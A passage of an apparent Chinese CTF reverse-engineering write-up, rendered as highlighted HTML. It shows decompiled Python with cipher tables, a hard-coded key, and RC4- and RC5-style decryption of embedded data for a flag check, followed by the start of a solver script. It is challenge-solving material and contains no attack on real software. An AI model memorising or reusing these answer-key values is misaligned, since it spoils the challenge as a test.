class="hljs-number">146</span>,</span><br><span class="line">        <span class="hljs-number">108</span>,</span><br><span class="line">        <span class="hljs-number">112</span>,</span><br><span class="line">        <span class="hljs-number">72</span>,</span><br><span class="line">        <span class="hljs-number">80</span>,</span><br><span class="line">        <span class="hljs-number">253</span>,</span><br><span class="line">        <span class="hljs-number">237</span>,</span><br><span class="line">        <span class="hljs-number">185</span>,</span><br><span class="line">        <span class="hljs-number">218</span>,</span><br><span class="line">        <span class="hljs-number">94</span>,</span><br><span class="line">        <span class="hljs-number">21</span>,</span><br><span class="line">        <span class="hljs-number">70</span>,</span><br><span class="line">        <span class="hljs-number">87</span>,</span><br><span class="line">        <span class="hljs-number">167</span>,</span><br><span class="line">        <span class="hljs-number">141</span>,</span><br><span class="line">        <span class="hljs-number">157</span>,</span><br><span class="line">        <span class="hljs-number">132</span>,</span><br><span class="line">        <span class="hljs-number">144</span>,</span><br><span class="line">        <span class="hljs-number">216</span>,</span><br><span class="line">        <span class="hljs-number">171</span>,</span><br><span class="line">        <span class="hljs-number">0</span>,</span><br><span class="line">        <span class="hljs-number">140</span>,</span><br><span class="line">        <span class="hljs-number">188</span>,</span><br><span class="line">        <span class="hljs-number">211</span>,</span><br><span class="line">        <span class="hljs-number">10</span>,</span><br><span class="line">        <span class="hljs-number">247</span>,</span><br><span class="line">        <span class="hljs-number">228</span>,</span><br><span class="line">        <span class="hljs-number">88</span>,</span><br><span class="line">        <span class="hljs-number">5</span>,</span><br><span class="line">        <span class="hljs-number">184</span>,</span><br><span class="line">        <span class="hljs-number">179</span>,</span><br><span class="line">        <span class="hljs-number">69</span>,</span><br><span class="line">        <span class="hljs-number">6</span>,</span><br><span class="line">        <span class="hljs-number">208</span>,</span><br><span class="line">        <span class="hljs-number">44</span>,</span><br><span class="line">        <span class="hljs-number">30</span>,</span><br><span class="line">        <span class="hljs-number">143</span>,</span><br><span class="line">        <span class="hljs-number">202</span>,</span><br><span class="line">        <span class="hljs-number">63</span>,</span><br><span class="line">        <span class="hljs-number">15</span>,</span><br><span class="line">        <span class="hljs-number">2</span>,</span><br><span class="line">        <span class="hljs-number">193</span>,</span><br><span class="line">        <span class="hljs-number">175</span>,</span><br><span class="line">        <span class="hljs-number">189</span>,</span><br><span class="line">        <span class="hljs-number">3</span>,</span><br><span class="line">        <span class="hljs-number">1</span>,</span><br><span class="line">        <span class="hljs-number">19</span>,</span><br><span class="line">        <span class="hljs-number">138</span>,</span><br><span class="line">        <span class="hljs-number">107</span>,</span><br><span class="line">        <span class="hljs-number">58</span>,</span><br><span class="line">        <span class="hljs-number">145</span>,</span><br><span class="line">        <span class="hljs-number">17</span>,</span><br><span class="line">        <span class="hljs-number">65</span>,</span><br><span class="line">        <span class="hljs-number">79</span>,</span><br><span class="line">        <span class="hljs-number">103</span>,</span><br><span class="line">        <span class="hljs-number">220</span>,</span><br><span class="line">        <span class="hljs-number">234</span>,</span><br><span class="line">        <span class="hljs-number">151</span>,</span><br><span class="line">        <span class="hljs-number">242</span>,</span><br><span class="line">        <span class="hljs-number">207</span>,</span><br><span class="line">        <span class="hljs-number">206</span>,</span><br><span class="line">        <span class="hljs-number">240</span>,</span><br><span class="line">        <span class="hljs-number">180</span>,</span><br><span class="line">        <span class="hljs-number">230</span>,</span><br><span class="line">        <span class="hljs-number">115</span>,</span><br><span class="line">        <span class="hljs-number">150</span>,</span><br><span class="line">        <span class="hljs-number">172</span>,</span><br><span class="line">        <span class="hljs-number">116</span>,</span><br><span class="line">        <span class="hljs-number">34</span>,</span><br><span class="line">        <span class="hljs-number">231</span>,</span><br><span class="line">        <span class="hljs-number">173</span>,</span><br><span class="line">        <span class="hljs-number">53</span>,</span><br><span class="line">        <span class="hljs-number">133</span>,</span><br><span class="line">        <span class="hljs-number">226</span>,</span><br><span class="line">        <span class="hljs-number">249</span>,</span><br><span class="line">        <span class="hljs-number">55</span>,</span><br><span class="line">        <span class="hljs-number">232</span>,</span><br><span class="line">        <span class="hljs-number">28</span>,</span><br><span class="line">        <span class="hljs-number">117</span>,</span><br><span class="line">        <span class="hljs-number">223</span>,</span><br><span class="line">        <span class="hljs-number">110</span>,</span><br><span class="line">        <span class="hljs-number">71</span>,</span><br><span class="line">        <span class="hljs-number">241</span>,</span><br><span class="line">        <span class="hljs-number">26</span>,</span><br><span class="line">        <span class="hljs-number">113</span>,</span><br><span class="line">        <span class="hljs-number">29</span>,</span><br><span class="line">        <span class="hljs-number">41</span>,</span><br><span class="line">        <span class="hljs-number">197</span>,</span><br><span class="line">        <span class="hljs-number">137</span>,</span><br><span class="line">        <span class="hljs-number">111</span>,</span><br><span class="line">        <span class="hljs-number">183</span>,</span><br><span class="line">        <span class="hljs-number">98</span>,</span><br><span class="line">        <span class="hljs-number">14</span>,</span><br><span class="line">        <span class="hljs-number">170</span>,</span><br><span class="line">        <span class="hljs-number">24</span>,</span><br><span class="line">        <span class="hljs-number">190</span>,</span><br><span class="line">        <span class="hljs-number">27</span>,</span><br><span class="line">        <span class="hljs-number">252</span>,</span><br><span class="line">        <span class="hljs-number">86</span>,</span><br><span class="line">        <span class="hljs-number">62</span>,</span><br><span class="line">        <span class="hljs-number">75</span>,</span><br><span class="line">        <span class="hljs-number">198</span>,</span><br><span class="line">        <span class="hljs-number">210</span>,</span><br><span class="line">        <span class="hljs-number">121</span>,</span><br><span class="line">        <span class="hljs-number">32</span>,</span><br><span class="line">        <span class="hljs-number">154</span>,</span><br><span class="line">        <span class="hljs-number">219</span>,</span><br><span class="line">        <span class="hljs-number">192</span>,</span><br><span class="line">        <span class="hljs-number">254</span>,</span><br><span class="line">        <span class="hljs-number">120</span>,</span><br><span class="line">        <span class="hljs-number">205</span>,</span><br><span class="line">        <span class="hljs-number">90</span>,</span><br><span class="line">        <span class="hljs-number">244</span>,</span><br><span class="line">        <span class="hljs-number">31</span>,</span><br><span class="line">        <span class="hljs-number">221</span>,</span><br><span class="line">        <span class="hljs-number">168</span>,</span><br><span class="line">        <span class="hljs-number">51</span>,</span><br><span class="line">        <span class="hljs-number">136</span>,</span><br><span class="line">        <span class="hljs-number">7</span>,</span><br><span class="line">        <span class="hljs-number">199</span>,</span><br><span class="line">        <span class="hljs-number">49</span>,</span><br><span class="line">        <span class="hljs-number">177</span>,</span><br><span class="line">        <span class="hljs-number">18</span>,</span><br><span class="line">        <span class="hljs-number">16</span>,</span><br><span class="line">        <span class="hljs-number">89</span>,</span><br><span class="line">        <span class="hljs-number">39</span>,</span><br><span class="line">        <span class="hljs-number">128</span>,</span><br><span class="line">        <span class="hljs-number">236</span>,</span><br><span class="line">        <span class="hljs-number">95</span>,</span><br><span class="line">        <span class="hljs-number">96</span>,</span><br><span class="line">        <span class="hljs-number">81</span>,</span><br><span class="line">        <span class="hljs-number">127</span>,</span><br><span class="line">        <span class="hljs-number">169</span>,</span><br><span class="line">        <span class="hljs-number">25</span>,</span><br><span class="line">        <span class="hljs-number">181</span>,</span><br><span class="line">        <span class="hljs-number">74</span>,</span><br><span class="line">        <span class="hljs-number">13</span>,</span><br><span class="line">        <span class="hljs-number">45</span>,</span><br><span class="line">        <span class="hljs-number">229</span>,</span><br><span class="line">        <span class="hljs-number">122</span>,</span><br><span class="line">        <span class="hljs-number">159</span>,</span><br><span class="line">        <span class="hljs-number">147</span>,</span><br><span class="line">        <span class="hljs-number">201</span>,</span><br><span class="line">        <span class="hljs-number">156</span>,</span><br><span class="line">        <span class="hljs-number">239</span>,</span><br><span class="line">        <span class="hljs-number">160</span>,</span><br><span class="line">        <span class="hljs-number">224</span>,</span><br><span class="line">        <span class="hljs-number">59</span>,</span><br><span class="line">        <span class="hljs-number">77</span>,</span><br><span class="line">        <span class="hljs-number">174</span>,</span><br><span class="line">        <span class="hljs-number">42</span>,</span><br><span class="line">        <span class="hljs-number">245</span>,</span><br><span class="line">        <span class="hljs-number">176</span>,</span><br><span class="line">        <span class="hljs-number">200</span>,</span><br><span class="line">        <span class="hljs-number">235</span>,</span><br><span class="line">        <span class="hljs-number">187</span>,</span><br><span class="line">        <span class="hljs-number">60</span>,</span><br><span class="line">        <span class="hljs-number">131</span>,</span><br><span class="line">        <span class="hljs-number">83</span>,</span><br><span class="line">        <span class="hljs-number">153</span>,</span><br><span class="line">        <span class="hljs-number">97</span>,</span><br><span class="line">        <span class="hljs-number">23</span>,</span><br><span class="line">        <span class="hljs-number">43</span>,</span><br><span class="line">        <span class="hljs-number">4</span>,</span><br><span class="line">        <span class="hljs-number">126</span>,</span><br><span class="line">        <span class="hljs-number">186</span>,</span><br><span class="line">        <span class="hljs-number">119</span>,</span><br><span class="line">        <span class="hljs-number">214</span>,</span><br><span class="line">        <span class="hljs-number">38</span>,</span><br><span class="line">        <span class="hljs-number">225</span>,</span><br><span class="line">        <span class="hljs-number">105</span>,</span><br><span class="line">        <span class="hljs-number">20</span>,</span><br><span class="line">        <span class="hljs-number">99</span>,</span><br><span class="line">        <span class="hljs-number">85</span>,</span><br><span class="line">        <span class="hljs-number">33</span>,</span><br><span class="line">        <span class="hljs-number">12</span>,</span><br><span class="line">        <span class="hljs-number">125</span>]</span><br><span class="line">    Rcon = [</span><br><span class="line">        <span class="hljs-number">16777216</span>,</span><br><span class="line">        <span class="hljs-number">33554432</span>,</span><br><span class="line">        <span class="hljs-number">67108864</span>,</span><br><span class="line">        <span class="hljs-number">134217728</span>,</span><br><span class="line">        <span class="hljs-number">268435456</span>,</span><br><span class="line">        <span class="hljs-number">536870912</span>,</span><br><span class="line">        <span class="hljs-number">1073741824</span>,</span><br><span class="line">        <span class="hljs-number">0x80000000</span>,</span><br><span class="line">        <span class="hljs-number">452984832</span>,</span><br><span class="line">        <span class="hljs-number">905969664</span>]</span><br><span class="line">    s = []</span><br><span class="line">    key = <span class="hljs-string">'CalmDownBelieveU'</span></span><br><span class="line">    p1(s, key)</span><br><span class="line">    key = [</span><br><span class="line">        <span class="hljs-number">61</span>,</span><br><span class="line">        <span class="hljs-number">15</span>,</span><br><span class="line">        <span class="hljs-number">58</span>,</span><br><span class="line">        <span class="hljs-number">65</span>,</span><br><span class="line">        <span class="hljs-number">177</span>,</span><br><span class="line">        <span class="hljs-number">180</span>,</span><br><span class="line">        <span class="hljs-number">182</span>,</span><br><span class="line">        <span class="hljs-number">248</span>,</span><br><span class="line">        <span class="hljs-number">192</span>,</span><br><span class="line">        <span class="hljs-number">143</span>,</span><br><span class="line">        <span class="hljs-number">37</span>,</span><br><span class="line">        <span class="hljs-number">238</span>,</span><br><span class="line">        <span class="hljs-number">50</span>,</span><br><span class="line">        <span class="hljs-number">29</span>,</span><br><span class="line">        <span class="hljs-number">215</span>,</span><br><span class="line">        <span class="hljs-number">190</span>]</span><br><span class="line">    key = <span class="hljs-built_in">bytes</span>(p3(s, key))</span><br><span class="line">    <span class="hljs-built_in">print</span>(key)</span><br><span class="line">    extendKey = p2(<span class="hljs-built_in">bytes</span>(key))</span><br><span class="line">    opcode = [</span><br><span class="line">        <span class="hljs-number">69</span>,</span><br><span class="line">        <span class="hljs-number">136</span>,</span><br><span class="line">        <span class="hljs-number">121</span>,</span><br><span class="line">        <span class="hljs-number">24</span>,</span><br><span class="line">        <span class="hljs-number">179</span>,</span><br><span class="line">        <span class="hljs-number">67</span>,</span><br><span class="line">        <span class="hljs-number">209</span>,</span><br><span class="line">        <span class="hljs-number">20</span>,</span><br><span class="line">        <span class="hljs-number">27</span>,</span><br><span class="line">        <span class="hljs-number">169</span>,</span><br><span class="line">        <span class="hljs-number">205</span>,</span><br><span class="line">        <span class="hljs-number">146</span>,</span><br><span class="line">        <span class="hljs-number">212</span>,</span><br><span class="line">        <span class="hljs-number">160</span>,</span><br><span class="line">        <span class="hljs-number">124</span>,</span><br><span class="line">        <span class="hljs-number">49</span>,</span><br><span class="line">        <span class="hljs-number">20</span>,</span><br><span class="line">        <span class="hljs-number">155</span>,</span><br><span class="line">        <span class="hljs-number">157</span>,</span><br><span class="line">        <span class="hljs-number">253</span>,</span><br><span class="line">        <span class="hljs-number">52</span>,</span><br><span class="line">        <span class="hljs-number">71</span>,</span><br><span class="line">        <span class="hljs-number">174</span>,</span><br><span class="line">        <span class="hljs-number">164</span>,</span><br><span class="line">        <span class="hljs-number">134</span>,</span><br><span class="line">        <span class="hljs-number">60</span>,</span><br><span class="line">        <span class="hljs-number">184</span>,</span><br><span class="line">        <span class="hljs-number">203</span>,</span><br><span class="line">        <span class="hljs-number">131</span>,</span><br><span class="line">        <span class="hljs-number">210</span>,</span><br><span class="line">        <span class="hljs-number">57</span>,</span><br><span class="line">        <span class="hljs-number">151</span>,</span><br><span class="line">        <span class="hljs-number">77</span>,</span><br><span class="line">        <span class="hljs-number">241</span>,</span><br><span class="line">        <span class="hljs-number">61</span>,</span><br><span class="line">        <span class="hljs-number">6</span>,</span><br><span class="line">        <span class="hljs-number">13</span>,</span><br><span class="line">        <span class="hljs-number">52</span>,</span><br><span class="line">        <span class="hljs-number">235</span>,</span><br><span class="line">        <span class="hljs-number">37</span>,</span><br><span class="line">        <span class="hljs-number">100</span>,</span><br><span class="line">        <span class="hljs-number">178</span>,</span><br><span class="line">        <span class="hljs-number">8</span>,</span><br><span class="line">        <span class="hljs-number">238</span>,</span><br><span class="line">        <span class="hljs-number">205</span>,</span><br><span class="line">        <span class="hljs-number">27</span>,</span><br><span class="line">        <span class="hljs-number">194</span>,</span><br><span class="line">        <span class="hljs-number">159</span>,</span><br><span class="line">        <span class="hljs-number">230</span>,</span><br><span class="line">        <span class="hljs-number">165</span>,</span><br><span class="line">        <span class="hljs-number">211</span>,</span><br><span class="line">        <span class="hljs-number">221</span>,</span><br><span class="line">        <span class="hljs-number">100</span>,</span><br><span class="line">        <span class="hljs-number">217</span>,</span><br><span class="line">        <span class="hljs-number">111</span>,</span><br><span class="line">        <span class="hljs-number">202</span>,</span><br><span class="line">        <span class="hljs-number">185</span>,</span><br><span class="line">        <span class="hljs-number">207</span>,</span><br><span class="line">        <span class="hljs-number">226</span>,</span><br><span class="line">        <span class="hljs-number">50</span>,</span><br><span class="line">        <span class="hljs-number">88</span>,</span><br><span class="line">        <span class="hljs-number">4</span>,</span><br><span class="line">        <span class="hljs-number">58</span>,</span><br><span class="line">        <span class="hljs-number">73</span>,</span><br><span class="line">        <span class="hljs-number">10</span>,</span><br><span class="line">        <span class="hljs-number">92</span>,</span><br><span class="line">        <span class="hljs-number">24</span>,</span><br><span class="line">        <span class="hljs-number">230</span>,</span><br><span class="line">        <span class="hljs-number">246</span>,</span><br><span class="line">        <span class="hljs-number">245</span>,</span><br><span class="line">        <span class="hljs-number">21</span>,</span><br><span class="line">        <span class="hljs-number">110</span>,</span><br><span class="line">        <span class="hljs-number">182</span>,</span><br><span class="line">        <span class="hljs-number">151</span>,</span><br><span class="line">        <span class="hljs-number">85</span>,</span><br><span class="line">        <span class="hljs-number">28</span>,</span><br><span class="line">        <span class="hljs-number">181</span>,</span><br><span class="line">        <span class="hljs-number">191</span>,</span><br><span class="line">        <span class="hljs-number">185</span>,</span><br><span class="line">        <span class="hljs-number">236</span>,</span><br><span class="line">        <span class="hljs-number">92</span>,</span><br><span class="line">        <span class="hljs-number">98</span>,</span><br><span class="line">        <span class="hljs-number">222</span>,</span><br><span class="line">        <span class="hljs-number">85</span>,</span><br><span class="line">        <span class="hljs-number">228</span>,</span><br><span class="line">        <span class="hljs-number">14</span>,</span><br><span class="line">        <span class="hljs-number">235</span>,</span><br><span class="line">        <span class="hljs-number">93</span>,</span><br><span class="line">        <span class="hljs-number">77</span>,</span><br><span class="line">        <span class="hljs-number">161</span>,</span><br><span class="line">        <span class="hljs-number">61</span>,</span><br><span class="line">        <span class="hljs-number">140</span>,</span><br><span class="line">        <span class="hljs-number">222</span>,</span><br><span class="line">        <span class="hljs-number">74</span>,</span><br><span class="line">        <span class="hljs-number">124</span>,</span><br><span class="line">        <span class="hljs-number">13</span>,</span><br><span class="line">        <span class="hljs-number">211</span>,</span><br><span class="line">        <span class="hljs-number">75</span>,</span><br><span class="line">        <span class="hljs-number">134</span>,</span><br><span class="line">        <span class="hljs-number">235</span>,</span><br><span class="line">        <span class="hljs-number">164</span>,</span><br><span class="line">        <span class="hljs-number">228</span>,</span><br><span class="line">        <span class="hljs-number">235</span>,</span><br><span class="line">        <span class="hljs-number">16</span>,</span><br><span class="line">        <span class="hljs-number">29</span>,</span><br><span class="line">        <span class="hljs-number">41</span>,</span><br><span class="line">        <span class="hljs-number">49</span>,</span><br><span class="line">        <span class="hljs-number">105</span>,</span><br><span class="line">        <span class="hljs-number">188</span>,</span><br><span class="line">        <span class="hljs-number">51</span>,</span><br><span class="line">        <span class="hljs-number">232</span>,</span><br><span class="line">        <span class="hljs-number">65</span>,</span><br><span class="line">        <span class="hljs-number">209</span>,</span><br><span class="line">        <span class="hljs-number">165</span>,</span><br><span class="line">        <span class="hljs-number">35</span>,</span><br><span class="line">        <span class="hljs-number">182</span>,</span><br><span class="line">        <span class="hljs-number">248</span>,</span><br><span class="line">        <span class="hljs-number">245</span>,</span><br><span class="line">        <span class="hljs-number">69</span>,</span><br><span class="line">        <span class="hljs-number">18</span>,</span><br><span class="line">        <span class="hljs-number">152</span>,</span><br><span class="line">        <span class="hljs-number">71</span>,</span><br><span class="line">        <span class="hljs-number">223</span>,</span><br><span class="line">        <span class="hljs-number">85</span>,</span><br><span class="line">        <span class="hljs-number">114</span>]</span><br><span class="line">    opcode = p3(s, opcode)</span><br><span class="line">    <span class="hljs-comment"># print(opcode)</span></span><br><span class="line">    right = Have()</span><br><span class="line">    back = Fun(right)</span><br><span class="line">    data1 = [</span><br><span class="line">        <span class="hljs-number">228</span>,</span><br><span class="line">        <span class="hljs-number">244</span>,</span><br><span class="line">        <span class="hljs-number">207</span>,</span><br><span class="line">        <span class="hljs-number">251</span>,</span><br><span class="line">        <span class="hljs-number">194</span>,</span><br><span class="line">        <span class="hljs-number">124</span>,</span><br><span class="line">        <span class="hljs-number">252</span>,</span><br><span class="line">        <span class="hljs-number">61</span>,</span><br><span class="line">        <span class="hljs-number">198</span>,</span><br><span class="line">        <span class="hljs-number">145</span>,</span><br><span class="line">        <span class="hljs-number">97</span>,</span><br><span class="line">        <span class="hljs-number">98</span>,</span><br><span class="line">        <span class="hljs-number">89</span>,</span><br><span class="line">        <span class="hljs-number">25</span>,</span><br><span class="line">        <span class="hljs-number">92</span>,</span><br><span class="line">        <span class="hljs-number">208</span>,</span><br><span class="line">        <span class="hljs-number">155</span>,</span><br><span class="line">        <span class="hljs-number">38</span>,</span><br><span class="line">        <span class="hljs-number">34</span>,</span><br><span class="line">        <span class="hljs-number">225</span>,</span><br><span class="line">        <span class="hljs-number">98</span>,</span><br><span class="line">        <span class="hljs-number">206</span>,</span><br><span class="line">        <span class="hljs-number">234</span>,</span><br><span class="line">        <span class="hljs-number">245</span>,</span><br><span class="line">        <span class="hljs-number">223</span>,</span><br><span class="line">        <span class="hljs-number">54</span>,</span><br><span class="line">        <span class="hljs-number">214</span>,</span><br><span class="line">        <span class="hljs-number">137</span>,</span><br><span class="line">        <span class="hljs-number">35</span>,</span><br><span class="line">        <span class="hljs-number">86</span>,</span><br><span class="line">        <span class="hljs-number">180</span>,</span><br><span class="line">        <span class="hljs-number">66</span>,</span><br><span class="line">        <span class="hljs-number">223</span>,</span><br><span class="line">        <span class="hljs-number">234</span>,</span><br><span class="line">        <span class="hljs-number">90</span>,</span><br><span class="line">        <span class="hljs-number">136</span>,</span><br><span class="line">        <span class="hljs-number">5</span>,</span><br><span class="line">        <span class="hljs-number">189</span>,</span><br><span class="line">        <span class="hljs-number">166</span>,</span><br><span class="line">        <span class="hljs-number">117</span>,</span><br><span class="line">        <span class="hljs-number">111</span>,</span><br><span class="line">        <span class="hljs-number">222</span>,</span><br><span class="line">        <span class="hljs-number">39</span>,</span><br><span class="line">        <span class="hljs-number">156</span>,</span><br><span class="line">        <span class="hljs-number">163</span>,</span><br><span class="line">        <span class="hljs-number">173</span>,</span><br><span class="line">        <span class="hljs-number">36</span>,</span><br><span class="line">        <span class="hljs-number">174</span>,</span><br><span class="line">        <span class="hljs-number">47</span>,</span><br><span class="line">        <span class="hljs-number">144</span>,</span><br><span class="line">        <span class="hljs-number">15</span>,</span><br><span class="line">        <span class="hljs-number">160</span>,</span><br><span class="line">        <span class="hljs-number">45</span>,</span><br><span class="line">        <span class="hljs-number">239</span>,</span><br><span class="line">        <span class="hljs-number">211</span>,</span><br><span class="line">        <span class="hljs-number">11</span>,</span><br><span class="line">        <span class="hljs-number">190</span>,</span><br><span class="line">        <span class="hljs-number">181</span>,</span><br><span class="line">        <span class="hljs-number">24</span>,</span><br><span class="line">        <span class="hljs-number">164</span>,</span><br><span class="line">        <span class="hljs-number">234</span>,</span><br><span class="line">        <span class="hljs-number">114</span>,</span><br><span class="line">        <span class="hljs-number">174</span>,</span><br><span class="line">        <span class="hljs-number">27</span>]</span><br><span class="line">    data1 = <span class="hljs-built_in">bytes</span>(p3(s, data1))</span><br><span class="line">    data2 = [</span><br><span class="line">        <span class="hljs-number">165</span>,</span><br><span class="line">        <span class="hljs-number">83</span>,</span><br><span class="line">        <span class="hljs-number">203</span>,</span><br><span class="line">        <span class="hljs-number">51</span>,</span><br><span class="line">        <span class="hljs-number">99</span>,</span><br><span class="line">        <span class="hljs-number">164</span>,</span><br><span class="line">        <span class="hljs-number">30</span>,</span><br><span class="line">        <span class="hljs-number">91</span>,</span><br><span class="line">        <span class="hljs-number">230</span>,</span><br><span class="line">        <span class="hljs-number">64</span>,</span><br><span class="line">        <span class="hljs-number">181</span>,</span><br><span class="line">        <span class="hljs-number">55</span>,</span><br><span class="line">        <span class="hljs-number">190</span>,</span><br><span class="line">        <span class="hljs-number">47</span>,</span><br><span class="line">        <span class="hljs-number">125</span>,</span><br><span class="line">        <span class="hljs-number">240</span>,</span><br><span class="line">        <span class="hljs-number">186</span>,</span><br><span class="line">        <span class="hljs-number">173</span>,</span><br><span class="line">        <span class="hljs-number">116</span>,</span><br><span class="line">        <span class="hljs-number">47</span>,</span><br><span class="line">        <span class="hljs-number">89</span>,</span><br><span class="line">        <span class="hljs-number">64</span>,</span><br><span class="line">        <span class="hljs-number">68</span>,</span><br><span class="line">        <span class="hljs-number">215</span>,</span><br><span class="line">        <span class="hljs-number">124</span>,</span><br><span class="line">        <span class="hljs-number">138</span>,</span><br><span class="line">        <span class="hljs-number">34</span>,</span><br><span class="line">        <span class="hljs-number">175</span>,</span><br><span class="line">        <span class="hljs-number">60</span>,</span><br><span class="line">        <span class="hljs-number">136</span>,</span><br><span class="line">        <span class="hljs-number">77</span>,</span><br><span class="line">        <span class="hljs-number">216</span>,</span><br><span class="line">        <span class="hljs-number">250</span>,</span><br><span class="line">        <span class="hljs-number">127</span>,</span><br><span class="line">        <span class="hljs-number">14</span>,</span><br><span class="line">        <span class="hljs-number">14</span>,</span><br><span class="line">        <span class="hljs-number">66</span>,</span><br><span class="line">        <span class="hljs-number">168</span>,</span><br><span class="line">        <span class="hljs-number">198</span>,</span><br><span class="line">        <span class="hljs-number">247</span>,</span><br><span class="line">        <span class="hljs-number">252</span>,</span><br><span class="line">        <span class="hljs-number">189</span>,</span><br><span class="line">        <span class="hljs-number">243</span>,</span><br><span class="line">        <span class="hljs-number">239</span>,</span><br><span class="line">        <span class="hljs-number">25</span>,</span><br><span class="line">        <span class="hljs-number">63</span>,</span><br><span class="line">        <span class="hljs-number">143</span>,</span><br><span class="line">        <span class="hljs-number">7</span>,</span><br><span class="line">        <span class="hljs-number">177</span>,</span><br><span class="line">        <span class="hljs-number">13</span>,</span><br><span class="line">        <span class="hljs-number">99</span>,</span><br><span class="line">        <span class="hljs-number">226</span>,</span><br><span class="line">        <span class="hljs-number">100</span>,</span><br><span class="line">        <span class="hljs-number">6</span>,</span><br><span class="line">        <span class="hljs-number">207</span>,</span><br><span class="line">        <span class="hljs-number">77</span>,</span><br><span class="line">        <span class="hljs-number">46</span>,</span><br><span class="line">        <span class="hljs-number">136</span>,</span><br><span class="line">        <span class="hljs-number">251</span>,</span><br><span class="line">        <span class="hljs-number">123</span>,</span><br><span class="line">        <span class="hljs-number">225</span>,</span><br><span class="line">        <span class="hljs-number">27</span>,</span><br><span class="line">        <span class="hljs-number">76</span>,</span><br><span class="line">        <span class="hljs-number">183</span>]</span><br><span class="line">    data2 = <span class="hljs-built_in">bytes</span>(p3(s, data2))</span><br><span class="line">    <span class="hljs-built_in">print</span>(data2)</span><br><span class="line">    <span class="hljs-built_in">print</span>(extendKey)</span><br><span class="line">    data3 = [</span><br><span class="line">        <span class="hljs-number">95</span>,</span><br><span class="line">        <span class="hljs-number">219</span>,</span><br><span class="line">        <span class="hljs-number">46</span>,</span><br><span class="line">        <span class="hljs-number">178</span>,</span><br><span class="line">        <span class="hljs-number">111</span>,</span><br><span class="line">        <span class="hljs-number">141</span>,</span><br><span class="line">        <span class="hljs-number">17</span>,</span><br><span class="line">        <span class="hljs-number">168</span>,</span><br><span class="line">        <span class="hljs-number">254</span>,</span><br><span class="line">        <span class="hljs-number">60</span>,</span><br><span class="line">        <span class="hljs-number">68</span>,</span><br><span class="line">        <span class="hljs-number">59</span>,</span><br><span class="line">        <span class="hljs-number">41</span>,</span><br><span class="line">        <span class="hljs-number">183</span>,</span><br><span class="line">        <span class="hljs-number">182</span>,</span><br><span class="line">        <span class="hljs-number">118</span>,</span><br><span class="line">        <span class="hljs-number">3</span>,</span><br><span class="line">        <span class="hljs-number">47</span>,</span><br><span class="line">        <span class="hljs-number">150</span>,</span><br><span class="line">        <span class="hljs-number">240</span>,</span><br><span class="line">        <span class="hljs-number">140</span>,</span><br><span class="line">        <span class="hljs-number">159</span>,</span><br><span class="line">        <span class="hljs-number">110</span>,</span><br><span class="line">        <span class="hljs-number">238</span>]</span><br><span class="line">    data3 = <span class="hljs-built_in">bytes</span>(p3(s, data3))</span><br><span class="line">    <span class="hljs-built_in">print</span>(back)</span><br><span class="line">    <span class="hljs-keyword">if</span> back == data2:</span><br><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(data1).decode())</span><br><span class="line">    <span class="hljs-keyword">else</span>:</span><br><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(data3).decode())</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>做的时候不知道是rc5，直接对着写了一个加解密</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">res = <span class="hljs-string">b'\x04:\xf26V\xb1\x9a\xfc\xf7\x1e!\xdc\xdb\x8f\x8e\x94M4\xe7\x9d\x9cR\x0cn\xfb\xfa\xd5\xfd2\xf9x,\xbb\xbe9\xc1\xd9\x85u\xb6(\xf8\xccx\xa4\xe4\x85\x92\x0e\xbdr\xc5\xaf\x87\x91*\x8b\xf1\xef\x96\x16`\xd1\x12'</span></span><br><span class="line">ek = [<span class="hljs-number">1835819331</span>, <span class="hljs-number">1853321028</span>, <span class="hljs-number">1768711490</span>, <span class="hljs-number">1432712805</span>, <span class="hljs-number">2177920767</span>, <span class="hljs-number">4020699579</span>, <span class="hljs-number">2261476601</span>, <span class="hljs-number">3551400604</span>, <span class="hljs-number">711874531</span>, <span class="hljs-number">3318306392</span>, <span class="hljs-number">1124217505</span>, <span class="hljs-number">2427199549</span>, <span class="hljs-number">3099853672</span>, <span class="hljs-number">2098025776</span>, <span class="hljs-number">1041196945</span>, <span class="hljs-number">2929936300</span>, <span class="hljs-number">246748610</span>, <span class="hljs-number">1941455090</span>, <span class="hljs-number">1303848803</span>, <span class="hljs-number">3809763535</span>, <span class="hljs-number">1395557789</span>, <span class="hljs-number">546751855</span>, <span class="hljs-number">1830937100</span>, <span class="hljs-number">2385871555</span>, <span class="hljs-number">2516030638</span>, <span class="hljs-number">3043054017</span>, <span class="hljs-number">3628118989</span>, <span class="hljs-number">1450520846</span>, <span class="hljs-number">1825094265</span>, <span class="hljs-number">3651791800</span>, <span class="hljs-number">32069749</span>, <span class="hljs-number">1469868411</span>, <span class="hljs-number">919887482</span>, <span class="hljs-number">4017993154</span>, <span class="hljs-number">4002737591</span>, <span class="hljs-number">3104343244</span>, <span class="hljs-number">4134211933</span>, <span class="hljs-number">420914335</span>, <span class="hljs-number">4152510760</span>, <span class="hljs-number">1317719524</span>, <span class="hljs-number">1990496755</span>, <span class="hljs-number">1873950060</span>, <span class="hljs-number">2553314372</span>, <span class="hljs-number">3602559392</span>]</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span 